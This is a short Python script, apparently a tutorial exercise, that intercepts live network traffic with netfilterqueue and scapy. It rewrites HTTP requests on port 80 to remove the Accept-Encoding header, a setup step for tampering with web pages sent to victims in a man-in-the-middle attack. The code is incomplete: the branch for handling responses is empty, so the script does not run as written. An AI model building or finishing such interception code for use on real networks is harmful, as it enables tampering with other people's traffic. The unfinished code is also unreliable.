#!/usr/bin/env python

import netfilterqueue
# module that allow to access the queue from python
import scapy.all as scapy
import re
# module that handle regular expression

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
           print("request")
           modefied_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
           # match the string with "Accept-Encoding:.*?\\r\\n" rule , in the
           # bigger "string scapy_packet[scapy.Raw].load" that is the raw layer
           # of the scapy packet , and replace it with nothing
           new_packet = set_load(scapy_packet, modefied_load)
           # that will give us a new packet that is
           # identical to scapy packet but with the
           # modified load that is returned by "modefied_load" function
           packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:




queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
